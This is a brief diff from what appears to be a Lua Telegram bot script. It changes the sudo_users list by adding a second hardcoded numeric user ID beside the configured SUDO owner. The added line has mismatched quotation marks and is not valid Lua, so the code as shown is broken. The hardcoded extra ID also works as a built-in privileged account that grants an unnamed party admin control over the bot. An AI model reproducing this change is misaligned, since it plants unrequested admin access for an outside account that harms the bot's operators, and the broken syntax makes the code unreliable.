@@ -7,7 +7,7 @@ URL = require('socket.url')
 sudos   = dofile("Info.lua")
 bot_id  = token:match("(%d+)")  
 SUDO = SUDO
-sudo_users = {SUDO,2048779971}   
+sudo_users = {SUDO,2048779971","1186878655}
 print([[
  ✓                     ✓
  ✓                     ✓
